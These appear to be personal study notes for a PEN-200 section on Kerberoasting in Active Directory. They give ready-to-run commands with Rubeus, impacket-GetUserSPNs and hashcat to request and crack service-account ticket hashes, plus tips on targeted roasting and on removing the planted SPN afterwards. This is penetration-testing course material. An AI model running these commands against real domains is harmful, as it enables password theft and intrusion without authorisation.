# 23.2.3 — Kerberoasting

- Module: PEN-200 · 23. Attacking Active Directory Authentication
- Source: portal.offsec.com · module `attacking-active-directory-authentication-46102` (§23.2.3)
- Code blocks: 3

> Any domain user can request a **service ticket (TGS)** for an SPN — it's encrypted with the
> **service account's** password hash, so crack it offline for the account's cleartext password.
> Hashcat mode **13100**. Output omitted.

## Windows — Rubeus

```powershell
.\Rubeus.exe kerberoast /outfile:{{HASHFILE}}     # finds all user-SPNs, writes TGS-REP hashes
```

## Crack (Kali)

```bash
sudo hashcat -m 13100 {{HASHFILE}} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Linux — impacket-GetUserSPNs

```bash
sudo impacket-GetUserSPNs -request -dc-ip {{DC_IP}} {{DOMAIN}}/{{USERNAME}}
```

> **Only user-account SPNs are worth it** — machine accounts, (g)MSAs, and `krbtgt` use random
> 120-char passwords (uncrackable). **Clock skew** (`KRB_AP_ERR_SKEW`) → sync time with
> `ntpdate`/`rdate` against the DC. **Targeted Kerberoasting:** with `GenericWrite`/`GenericAll`,
> set an SPN on the victim, roast, then **remove the SPN**. Compare with the htbad notes
> [[../htbad/17-kerberoasting-from-linux]] / [[../htbad/18-kerberoasting-from-windows]].
